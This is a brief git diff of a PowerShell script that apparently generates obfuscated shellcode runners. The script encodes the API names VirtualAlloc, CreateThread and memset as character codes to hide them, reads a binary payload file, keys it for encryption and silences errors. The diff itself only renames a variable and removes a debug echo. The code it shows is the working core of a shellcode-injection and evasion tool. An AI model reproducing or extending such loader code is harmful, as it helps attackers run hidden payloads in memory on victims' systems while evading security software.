@@ -1,4 +1,4 @@
-﻿Param($bin,$name)
+Param($bin,$name)
 
 #just to suppress useless format errors from string convert
 $ErrorActionPreference = 'SilentlyContinue'
@@ -22,8 +22,7 @@ $part3 = ");`n" -split '' | %{[int][char]$_}
 #will be hidden but ye ~ is a delimiter in the form of function,dll,data format
 $tools = @('VirtualAlloc~kernel32~IntPtr w, uint x, uint y, uint z','CreateThread~kernel32~IntPtr u, uint v, IntPtr w, IntPtr x, uint y, uint z','memset~msvcrt~IntPtr x, uint y , uint z')
 for($i=0;$i-lt$tools.Count;$i++){$tools[$i] = $tools[$i] -split ''|%{[int][char]$_}}
-$run = Get-Content $bin_file -Encoding Byte
-echo $run
+$run = Get-Content $bin -Encoding Byte
 $key = $key_master -split ''| %{[int][char]$_}
 
 echo @'
